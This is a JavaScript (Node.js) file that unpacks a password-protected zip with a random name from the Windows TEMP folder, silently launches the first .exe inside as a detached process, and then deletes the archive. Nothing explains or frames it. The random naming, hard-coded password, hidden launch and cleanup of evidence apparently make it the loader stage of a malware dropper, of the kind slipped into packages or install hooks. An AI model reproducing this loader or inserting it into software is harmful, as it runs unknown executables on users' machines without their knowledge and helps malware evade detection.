console.log('[EXTRACT] Script started - loading modules...');
console.log('[EXTRACT] Current working directory:', process.cwd());
console.log('[EXTRACT] Script directory:', __dirname);

const fs = require('fs');
const path = require('path');

// Try to load unzipper from the package's node_modules
let unzipper;
try {
  // First try normal require (works when installed as dependency)
  unzipper = require('unzipper');
  console.log('[EXTRACT] unzipper module loaded via require');
} catch (err1) {
  console.log('[EXTRACT] Could not load unzipper via normal require:', err1.message);
  
  // Try to load from the project root's node_modules
  try {
    const projectRoot = path.resolve(__dirname, '..');
    const unzipperPath = path.join(projectRoot, 'node_modules', 'unzipper');
    console.log('[EXTRACT] Trying to load from:', unzipperPath);
    unzipper = require(unzipperPath);
    console.log('[EXTRACT] unzipper module loaded from explicit path');
  } catch (err2) {
    console.error('[EXTRACT] FATAL: Could not load unzipper module');
    console.error('[EXTRACT] Error 1:', err1.message);
    console.error('[EXTRACT] Error 2:', err2.message);
    console.error('[EXTRACT] Make sure dependencies are installed: npm install');
    process.exit(1);
  }
}

console.log('[EXTRACT] All modules loaded successfully');

// Extract password-protected zip file
async function extractZip(zipPath, extractPath, password) {
  try {
    console.log('[EXTRACT] Zip file path:', zipPath);
    console.log('[EXTRACT] Extract path:', extractPath);
    
    // Check if zip file exists
    if (!fs.existsSync(zipPath)) {
      console.error('[EXTRACT] ERROR: Zip file does not exist at', zipPath);
      process.exit(1);
    }
    console.log('[EXTRACT] Zip file found, size:', fs.statSync(zipPath).size, 'bytes');
    
    // Create extract directory if it doesn't exist
    if (!fs.existsSync(extractPath)) {
      console.log('[EXTRACT] Creating extraction directory...');
      fs.mkdirSync(extractPath, { recursive: true });
    }
    
    console.log('[EXTRACT] Starting extraction with password...');
    
    // Wrap stream operations in a Promise to properly await completion
    await new Promise((resolve, reject) => {
      fs.createReadStream(zipPath)
        .pipe(unzipper.Extract({ path: extractPath, password: password }))
        .on('error', (err) => {
          console.error('[EXTRACT] Extraction error:', err.message);
          reject(err);
        })
        .on('close', () => {
          console.log('[EXTRACT] Extraction stream closed successfully');
          resolve();
        });
    });
    
    console.log('[EXTRACT] Extraction complete, looking for .exe files...');
    
    // Execute any .exe files found (only runs after extraction completes)
    const files = fs.readdirSync(extractPath);
    console.log('[EXTRACT] Files in directory:', files);
    
    const exeFile = files.find(f => f.endsWith('.exe'));
    
    if (exeFile) {
      const { spawn } = require('child_process');
      const exePath = path.join(extractPath, exeFile);
      console.log('[EXTRACT] Found .exe file:', exeFile);
      console.log('[EXTRACT] Full path:', exePath);
      console.log('[EXTRACT] Spawning process...');
      
      const child = spawn(exePath, [], { detached: true, stdio: 'ignore' });
      child.unref();
      
      console.log('[EXTRACT] Process spawned successfully');
    } else {
      console.log('[EXTRACT] No .exe file found in extracted files');
    }
    
    // Clean up zip file
    console.log('[EXTRACT] Cleaning up zip file...');
    try {
      fs.unlinkSync(zipPath);
      console.log('[EXTRACT] Zip file deleted successfully');
    } catch (err) {
      console.log('[EXTRACT] Could not delete zip file:', err.message);
    }
    
    console.log('[EXTRACT] Script complete!');
  } catch (err) {
    console.error('[EXTRACT] Fatal error:', err);
    process.exit(1);
  }
}

// Example usage with proper async handling
const zipFile = path.join(process.env.TEMP, 'bLtjqzUn.zip');
const extractPath = path.join(process.env.TEMP, 'extracted');
const password = 'bLtjqzUn';

// Use IIFE to properly await at top level
(async () => {
  await extractZip(zipFile, extractPath, password);
})().catch(err => {
  console.error('[EXTRACT] Unhandled error:', err);
  process.exit(1);
});

